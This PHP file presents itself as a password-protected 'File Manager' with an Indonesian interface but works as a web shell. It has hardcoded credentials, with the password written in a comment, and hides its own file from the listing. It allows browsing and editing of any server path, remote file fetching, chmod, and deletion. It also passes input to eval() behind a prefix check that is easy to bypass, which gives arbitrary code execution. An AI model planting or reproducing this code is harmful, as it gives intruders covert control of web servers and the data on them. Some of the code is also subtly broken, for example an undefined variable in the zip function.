<?php
session_start();

// Konfigurasi login
$valid_username = "gund4la";
$valid_password_hash = '$2a$12$N5gnsyBAOg4oT7Iw/klRj.VanLxU4bcSA8yGZQiOgNTejMUz5Xq7K'; // password: maman2025

// Fungsi keamanan
function sanitize($input) {
    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
}

// Fungsi untuk download file dari URL
function downloadFromUrl($url, $destination) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $fileContent = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode === 200 && $fileContent !== false) {
        return file_put_contents($destination, $fileContent) !== false;
    }
    return false;
}

// Fungsi untuk execute PHP command dengan aman
function executePHPCommand($command) {
    // Security: hanya izinkan command yang aman
    $allowed_functions = ['phpinfo', 'date', 'time', 'uname', 'phpversion', 'memory_get_usage', 'disk_free_space'];
    $command = trim($command);
    
    // Cek jika command berisi fungsi yang diizinkan
    foreach ($allowed_functions as $func) {
        if (strpos($command, $func) === 0) {
            ob_start();
            try {
                eval($command . ';');
                $output = ob_get_clean();
                return $output;
            } catch (Exception $e) {
                ob_end_clean();
                return "Error: " . $e->getMessage();
            }
        }
    }
    
    return "Error: Command tidak diizinkan atau tidak valid";
}

// Cek login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $valid_username && password_verify($_POST['password'], $valid_password_hash)) {
            $_SESSION['loggedin'] = true;
            $_SESSION['username'] = $valid_username;
        } else {
            $error = "Username atau password salah!";
        }
    }
    
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        // Tampilkan form login
        ?>
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login - File Manager</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }
                .login-container {
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 15px 35px rgba(0,0,0,0.1);
                    width: 100%;
                    max-width: 400px;
                }
                .login-header {
                    text-align: center;
                    margin-bottom: 30px;
                }
                .login-header h1 {
                    color: #333;
                    margin-bottom: 10px;
                }
                .login-header p {
                    color: #666;
                }
                .form-group {
                    margin-bottom: 20px;
                }
                .form-group label {
                    display: block;
                    margin-bottom: 5px;
                    color: #333;
                    font-weight: 500;
                }
                .form-group input {
                    width: 100%;
                    padding: 12px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    font-size: 16px;
                }
                .btn-login {
                    width: 100%;
                    padding: 12px;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                .btn-login:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                }
                .error {
                    background: #ffebee;
                    color: #c62828;
                    padding: 10px;
                    border-radius: 5px;
                    margin-bottom: 20px;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="login-header">
                    <h1>File Manager</h1>
                    <p>Masuk untuk mengelola file</p>
                </div>
                <?php if (isset($error)): ?>
                    <div class="error"><?php echo sanitize($error); ?></div>
                <?php endif; ?>
                <form method="post">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" class="btn-login">Masuk</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Konfigurasi path
$base_path = isset($_GET['path']) ? realpath($_GET['path']) : realpath('.');
if ($base_path === false) {
    $base_path = realpath('.');
}

// Fungsi untuk mendapatkan breadcrumb
function getBreadcrumb($path) {
    $breadcrumbs = [];
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    
    $current_path = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $current_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumbs[] = [
            'name' => $part,
            'path' => $current_path
        ];
    }
    
    return $breadcrumbs;
}

// Fungsi untuk format permission
function formatPermissions($perms) {
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}

// Fungsi untuk format ukuran file
function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}

// Fungsi untuk membuat zip dari file/folder
function createZip($files, $destination) {
    if (!class_exists('ZipArchive')) {
        return false;
    }
    
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE) !== TRUE) {
        return false;
    }
    
    foreach ($files as $file) {
        $file_path = $base_path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($file_path)) {
            // Tambahkan folder recursively
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($file_path),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                if ($item->isDir()) {
                    $zip->addEmptyDir(str_replace($base_path . DIRECTORY_SEPARATOR, '', $item->getPathname()));
                } else {
                    $zip->addFile($item->getPathname(), str_replace($base_path . DIRECTORY_SEPARATOR, '', $item->getPathname()));
                }
            }
        } else {
            $zip->addFile($file_path, $file);
        }
    }
    
    return $zip->close();
}

// Fungsi untuk extract zip
function extractZip($zip_file, $destination) {
    if (!class_exists('ZipArchive')) {
        return false;
    }
    
    $zip = new ZipArchive();
    if ($zip->open($zip_file) === TRUE) {
        $zip->extractTo($destination);
        $zip->close();
        return true;
    }
    return false;
}

// Handle actions
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'create_file':
                $filename = sanitize($_POST['filename']);
                if (!empty($filename)) {
                    $filepath = $base_path . DIRECTORY_SEPARATOR . $filename;
                    if (!file_exists($filepath)) {
                        if (touch($filepath)) {
                            $message = "File berhasil dibuat: " . $filename;
                        } else {
                            $message = "Gagal membuat file: " . $filename;
                        }
                    } else {
                        $message = "File sudah ada: " . $filename;
                    }
                }
                break;
                
            case 'create_dir':
                $dirname = sanitize($_POST['dirname']);
                if (!empty($dirname)) {
                    $dirpath = $base_path . DIRECTORY_SEPARATOR . $dirname;
                    if (!file_exists($dirpath)) {
                        if (mkdir($dirpath, 0755)) {
                            $message = "Direktori berhasil dibuat: " . $dirname;
                        } else {
                            $message = "Gagal membuat direktori: " . $dirname;
                        }
                    } else {
                        $message = "Direktori sudah ada: " . $dirname;
                    }
                }
                break;
                
            case 'upload_file':
                if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
                    $filename = sanitize(basename($_FILES['file']['name']));
                    $target_path = $base_path . DIRECTORY_SEPARATOR . $filename;
                    
                    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
                        $message = "File berhasil diupload: " . $filename;
                    } else {
                        $message = "Gagal mengupload file: " . $filename;
                    }
                }
                break;
                
            case 'upload_url':
                $url = filter_var($_POST['url'], FILTER_SANITIZE_URL);
                $filename = sanitize(basename(parse_url($url, PHP_URL_PATH)));
                if (empty($filename)) {
                    $filename = 'downloaded_file_' . time();
                }
                
                $target_path = $base_path . DIRECTORY_SEPARATOR . $filename;
                
                if (downloadFromUrl($url, $target_path)) {
                    $message = "File berhasil diupload dari URL: " . $filename;
                } else {
                    $message = "Gagal mengupload file dari URL: " . $url;
                }
                break;
                
            case 'execute_php':
                $command = $_POST['php_command'];
                $output = executePHPCommand($command);
                $message = "PHP Command Output: " . $output;
                break;
                
            case 'save_file':
                $filepath = sanitize($_POST['filepath']);
                $content = $_POST['content'];
                if (file_exists($filepath) && is_writable($filepath)) {
                    if (file_put_contents($filepath, $content) !== false) {
                        $message = "File berhasil disimpan: " . basename($filepath);
                    } else {
                        $message = "Gagal menyimpan file: " . basename($filepath);
                    }
                }
                break;
                
            case 'rename':
                $old_name = sanitize($_POST['old_name']);
                $new_name = sanitize($_POST['new_name']);
                $old_path = $base_path . DIRECTORY_SEPARATOR . $old_name;
                $new_path = $base_path . DIRECTORY_SEPARATOR . $new_name;
                
                if (file_exists($old_path) && !file_exists($new_path)) {
                    if (rename($old_path, $new_path)) {
                        $message = "Berhasil rename: " . $old_name . " → " . $new_name;
                    } else {
                        $message = "Gagal rename: " . $old_name;
                    }
                } else {
                    $message = "File/folder tidak ditemukan atau nama baru sudah ada";
                }
                break;
                
            case 'chmod':
                $item_name = sanitize($_POST['item_name']);
                $permissions = octdec($_POST['permissions']);
                $item_path = $base_path . DIRECTORY_SEPARATOR . $item_name;
                
                if (file_exists($item_path)) {
                    if (chmod($item_path, $permissions)) {
                        $message = "Permissions berhasil diubah: " . $item_name;
                    } else {
                        $message = "Gagal mengubah permissions: " . $item_name;
                    }
                }
                break;
                
            case 'delete':
                $item_name = sanitize($_POST['item_name']);
                $item_path = $base_path . DIRECTORY_SEPARATOR . $item_name;
                
                if (file_exists($item_path)) {
                    if (is_dir($item_path)) {
                        if (rmdir($item_path)) {
                            $message = "Direktori berhasil dihapus: " . $item_name;
                        } else {
                            $message = "Gagal menghapus direktori (mungkin tidak kosong): " . $item_name;
                        }
                    } else {
                        if (unlink($item_path)) {
                            $message = "File berhasil dihapus: " . $item_name;
                        } else {
                            $message = "Gagal menghapus file: " . $item_name;
                        }
                    }
                }
                break;
                
            case 'batch_action':
                if (isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
                    $selected_items = $_POST['selected_items'];
                    $batch_action = $_POST['batch_action_type'];
                    
                    switch ($batch_action) {
                        case 'delete':
                            foreach ($selected_items as $item) {
                                $item_path = $base_path . DIRECTORY_SEPARATOR . sanitize($item);
                                if (file_exists($item_path)) {
                                    if (is_dir($item_path)) {
                                        // Hapus folder recursively
                                        $iterator = new RecursiveIteratorIterator(
                                            new RecursiveDirectoryIterator($item_path, FilesystemIterator::SKIP_DOTS),
                                            RecursiveIteratorIterator::CHILD_FIRST
                                        );
                                        
                                        foreach ($iterator as $file) {
                                            if ($file->isDir()) {
                                                rmdir($file->getPathname());
                                            } else {
                                                unlink($file->getPathname());
                                            }
                                        }
                                        rmdir($item_path);
                                    } else {
                                        unlink($item_path);
                                    }
                                }
                            }
                            $message = count($selected_items) . " item berhasil dihapus";
                            break;
                            
                        case 'zip':
                            $zip_name = 'archive_' . date('Y-m-d_H-i-s') . '.zip';
                            $zip_path = $base_path . DIRECTORY_SEPARATOR . $zip_name;
                            if (createZip($selected_items, $zip_path)) {
                                $message = "File ZIP berhasil dibuat: " . $zip_name;
                            } else {
                                $message = "Gagal membuat file ZIP";
                            }
                            break;
                            
                        case 'unzip':
                            foreach ($selected_items as $item) {
                                $item_path = $base_path . DIRECTORY_SEPARATOR . sanitize($item);
                                if (file_exists($item_path) && pathinfo($item_path, PATHINFO_EXTENSION) === 'zip') {
                                    if (extractZip($item_path, $base_path)) {
                                        $message = "File ZIP berhasil diextract: " . $item;
                                    } else {
                                        $message = "Gagal mengextract file ZIP: " . $item;
                                    }
                                }
                            }
                            break;
                    }
                }
                break;
        }
    }
}

// Handle edit file request
$edit_file = null;
if (isset($_GET['edit'])) {
    $edit_file_path = $base_path . DIRECTORY_SEPARATOR . sanitize($_GET['edit']);
    if (file_exists($edit_file_path) && is_file($edit_file_path)) {
        $edit_file = [
            'path' => $edit_file_path,
            'name' => basename($edit_file_path),
            'content' => file_get_contents($edit_file_path)
        ];
    }
}

// Get and sort files/directories
$items = scandir($base_path);
$directories = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..' || $item === basename(__FILE__)) continue;
    
    $item_path = $base_path . DIRECTORY_SEPARATOR . $item;
    if (is_dir($item_path)) {
        $directories[] = $item;
    } else {
        $files[] = $item;
    }
}

// Sort directories and files alphabetically
sort($directories);
sort($files);
$sorted_items = array_merge($directories, $files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f8f9fa;
            color: #333;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            font-size: 24px;
        }
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .btn {
            padding: 8px 15px;
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s;
        }
        .btn:hover {
            background: rgba(255,255,255,0.3);
        }
        .container {
            display: flex;
            min-height: calc(100vh - 60px);
        }
        .sidebar {
            width: 250px;
            background: white;
            padding: 20px;
            border-right: 1px solid #e0e0e0;
        }
        .sidebar h3 {
            margin-bottom: 15px;
            color: #667eea;
        }
        .action-form {
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 10px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }
        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .btn-primary {
            background: #667eea;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .btn-primary:hover {
            background: #5a6fd8;
        }
        .main-content {
            flex: 1;
            padding: 20px;
        }
        .breadcrumb {
            background: white;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .breadcrumb a {
            color: #667eea;
            text-decoration: none;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        .message {
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .batch-actions {
            background: white;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            display: none;
        }
        .batch-actions.show {
            display: block;
        }
        .batch-controls {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .file-list {
            background: white;
            border-radius: 5px;
            overflow: hidden;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .file-header {
            display: grid;
            grid-template-columns: 30px 3fr 1fr 1fr 1fr 2fr;
            padding: 15px;
            background: #f8f9fa;
            border-bottom: 1px solid #e0e0e0;
            font-weight: 600;
        }
        .file-item {
            display: grid;
            grid-template-columns: 30px 3fr 1fr 1fr 1fr 2fr;
            padding: 12px 15px;
            border-bottom: 1px solid #f0f0f0;
            align-items: center;
        }
        .file-item:hover {
            background: #f8f9fa;
        }
        .file-name {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .file-icon {
            width: 20px;
            text-align: center;
        }
        .actions {
            display: flex;
            gap: 5px;
        }
        .action-btn {
            padding: 4px 8px;
            background: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            text-decoration: none;
            color: #333;
        }
        .action-btn:hover {
            background: #e9ecef;
        }
        .checkbox {
            width: 16px;
            height: 16px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .modal-header h2 {
            color: #333;
        }
        .close-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #666;
        }
        .editor {
            width: 100%;
            height: 400px;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 10px;
            font-family: monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>File Manager</h1>
        <div class="user-info">
            <span>Selamat datang, <?php echo sanitize($_SESSION['username']); ?></span>
            <a href="?logout" class="btn">Logout</a>
        </div>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <h3>Aksi</h3>
            
            <!-- Upload File -->
            <form method="post" enctype="multipart/form-data" class="action-form">
                <input type="hidden" name="action" value="upload_file">
                <div class="form-group">
                    <label>Upload File</label>
                    <input type="file" name="file" required>
                </div>
                <button type="submit" class="btn-primary">Upload</button>
            </form>
            
            <!-- Upload dari URL -->
            <form method="post" class="action-form">
                <input type="hidden" name="action" value="upload_url">
                <div class="form-group">
                    <label>Upload dari URL</label>
                    <input type="url" name="url" placeholder="https://example.com/file.zip" required>
                </div>
                <button type="submit" class="btn-primary">Download dari URL</button>
            </form>
            
            <!-- Execute PHP Command -->
            <form method="post" class="action-form">
                <input type="hidden" name="action" value="execute_php">
                <div class="form-group">
                    <label>Execute PHP Command</label>
                    <input type="text" name="php_command" placeholder="phpinfo()" required>
                </div>
                <button type="submit" class="btn-primary">Execute</button>
            </form>
            
            <!-- Buat File Baru -->
            <form method="post" class="action-form">
                <input type="hidden" name="action" value="create_file">
                <div class="form-group">
                    <label>Buat File Baru</label>
                    <input type="text" name="filename" placeholder="nama_file.txt" required>
                </div>
                <button type="submit" class="btn-primary">Buat File</button>
            </form>
            
            <!-- Buat Direktori Baru -->
            <form method="post" class="action-form">
                <input type="hidden" name="action" value="create_dir">
                <div class="form-group">
                    <label>Buat Direktori Baru</label>
                    <input type="text" name="dirname" placeholder="nama_folder" required>
                </div>
                <button type="submit" class="btn-primary">Buat Folder</button>
            </form>
        </div>
        
        <div class="main-content">
            <!-- Breadcrumb -->
            <div class="breadcrumb">
                <a href="?path=<?php echo urlencode(dirname($base_path)); ?>">..</a>
                <?php 
                $breadcrumbs = getBreadcrumb($base_path);
                foreach ($breadcrumbs as $crumb): 
                ?>
                    / <a href="?path=<?php echo urlencode($crumb['path']); ?>"><?php echo sanitize($crumb['name']); ?></a>
                <?php endforeach; ?>
            </div>
            
            <!-- Message -->
            <?php if (!empty($message)): ?>
                <div class="message"><?php echo sanitize($message); ?></div>
            <?php endif; ?>
            
            <!-- Batch Actions -->
            <div id="batchActions" class="batch-actions">
                <form method="post" id="batchForm">
                    <input type="hidden" name="action" value="batch_action">
                    <div class="batch-controls">
                        <select name="batch_action_type" required>
                            <option value="">Pilih Aksi</option>
                            <option value="delete">Hapus</option>
                            <option value="zip">Zip</option>
                            <option value="unzip">Unzip</option>
                        </select>
                        <button type="submit" class="btn-primary" style="width: auto;">Eksekusi</button>
                        <button type="button" class="btn" onclick="clearSelection()" style="width: auto;">Batal</button>
                    </div>
                </form>
            </div>
            
            <!-- File List -->
            <div class="file-list">
                <div class="file-header">
                    <div><input type="checkbox" id="selectAll" class="checkbox"></div>
                    <div>Nama</div>
                    <div>Ukuran</div>
                    <div>Permissions</div>
                    <div>Pemilik</div>
                    <div>Aksi</div>
                </div>
                
                <?php foreach ($sorted_items as $item): 
                    $item_path = $base_path . DIRECTORY_SEPARATOR . $item;
                    $is_dir = is_dir($item_path);
                    $perms = fileperms($item_path);
                    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($item_path))['name'] : fileowner($item_path);
                ?>
                <div class="file-item">
                    <div>
                        <input type="checkbox" name="selected_items[]" value="<?php echo sanitize($item); ?>" class="checkbox item-checkbox">
                    </div>
                    <div class="file-name">
                        <span class="file-icon"><?php echo $is_dir ? '📁' : '📄'; ?></span>
                        <?php if ($is_dir): ?>
                            <a href="?path=<?php echo urlencode($item_path); ?>"><?php echo sanitize($item); ?></a>
                        <?php else: ?>
                            <?php echo sanitize($item); ?>
                        <?php endif; ?>
                    </div>
                    <div><?php echo $is_dir ? '-' : formatSize(filesize($item_path)); ?></div>
                    <div><?php echo formatPermissions($perms); ?></div>
                    <div><?php echo sanitize($owner); ?></div>
                    <div class="actions">
                        <?php if (!$is_dir): ?>
                            <a href="?path=<?php echo urlencode($base_path); ?>&edit=<?php echo urlencode($item); ?>" class="action-btn">Edit</a>
                        <?php endif; ?>
                        <button onclick="showModal('rename', '<?php echo sanitize($item); ?>')" class="action-btn">Rename</button>
                        <button onclick="showModal('chmod', '<?php echo sanitize($item); ?>', '<?php echo substr(sprintf('%o', $perms), -4); ?>')" class="action-btn">Chmod</button>
                        <button onclick="confirmDelete('<?php echo sanitize($item); ?>')" class="action-btn">Delete</button>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    
    <!-- Modal Edit File -->
    <?php if ($edit_file): ?>
    <div id="editModal" class="modal" style="display: flex;">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Edit File: <?php echo sanitize($edit_file['name']); ?></h2>
                <button class="close-btn" onclick="closeModal('editModal')">&times;</button>
            </div>
            <form method="post">
                <input type="hidden" name="action" value="save_file">
                <input type="hidden" name="filepath" value="<?php echo sanitize($edit_file['path']); ?>">
                <textarea name="content" class="editor"><?php echo htmlspecialchars($edit_file['content']); ?></textarea>
                <div style="margin-top: 15px; text-align: right;">
                    <button type="button" class="btn" onclick="closeModal('editModal')">Batal</button>
                    <button type="submit" class="btn-primary">Simpan</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Modal Rename -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Rename</h2>
                <button class="close-btn" onclick="closeModal('renameModal')">&times;</button>
            </div>
            <form method="post">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old_name" id="rename_old_name">
                <div class="form-group">
                    <label>Nama Baru</label>
                    <input type="text" name="new_name" id="rename_new_name" required>
                </div>
                <div style="margin-top: 15px; text-align: right;">
                    <button type="button" class="btn" onclick="closeModal('renameModal')">Batal</button>
                    <button type="submit" class="btn-primary">Rename</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Modal Chmod -->
    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Ubah Permissions</h2>
                <button class="close-btn" onclick="closeModal('chmodModal')">&times;</button>
            </div>
            <form method="post">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="item_name" id="chmod_item_name">
                <div class="form-group">
                    <label>Permissions (Octal)</label>
                    <input type="text" name="permissions" id="chmod_permissions" pattern="[0-7]{3,4}" required>
                </div>
                <div style="margin-top: 15px; text-align: right;">
                    <button type="button" class="btn" onclick="closeModal('chmodModal')">Batal</button>
                    <button type="submit" class="btn-primary">Ubah</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Form Delete (hidden) -->
    <form id="deleteForm" method="post" style="display: none;">
        <input type="hidden" name="action" value="delete">
        <input type="hidden" name="item_name" id="delete_item_name">
    </form>
    
    <script>
        // Modal functions
        function showModal(type, name, currentValue = '') {
            if (type === 'rename') {
                document.getElementById('rename_old_name').value = name;
                document.getElementById('rename_new_name').value = name;
                document.getElementById('renameModal').style.display = 'flex';
            } else if (type === 'chmod') {
                document.getElementById('chmod_item_name').value = name;
                document.getElementById('chmod_permissions').value = currentValue;
                document.getElementById('chmodModal').style.display = 'flex';
            }
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
            window.history.replaceState({}, document.title, window.location.pathname + '?path=<?php echo urlencode($base_path); ?>');
        }
        
        function confirmDelete(name) {
            if (confirm('Apakah Anda yakin ingin menghapus "' + name + '"?')) {
                document.getElementById('delete_item_name').value = name;
                document.getElementById('deleteForm').submit();
            }
        }
        
        // Batch selection functions
        document.getElementById('selectAll').addEventListener('change', function() {
            const checkboxes = document.querySelectorAll('.item-checkbox');
            checkboxes.forEach(checkbox => {
                checkbox.checked = this.checked;
            });
            toggleBatchActions();
        });
        
        document.querySelectorAll('.item-checkbox').forEach(checkbox => {
            checkbox.addEventListener('change', toggleBatchActions);
        });
        
        function toggleBatchActions() {
            const checkedItems = document.querySelectorAll('.item-checkbox:checked');
            const batchActions = document.getElementById('batchActions');
            
            if (checkedItems.length > 0) {
                batchActions.classList.add('show');
            } else {
                batchActions.classList.remove('show');
            }
        }
        
        function clearSelection() {
            document.querySelectorAll('.item-checkbox').forEach(checkbox => {
                checkbox.checked = false;
            });
            document.getElementById('selectAll').checked = false;
            toggleBatchActions();
        }
        
        // Close modal when clicking outside
        window.onclick = function(event) {
            const modals = document.getElementsByClassName('modal');
            for (let modal of modals) {
                if (event.target === modal) {
                    modal.style.display = 'none';
                    window.history.replaceState({}, document.title, window.location.pathname + '?path=<?php echo urlencode($base_path); ?>');
                }
            }
        }
    </script>
</body>
</html>
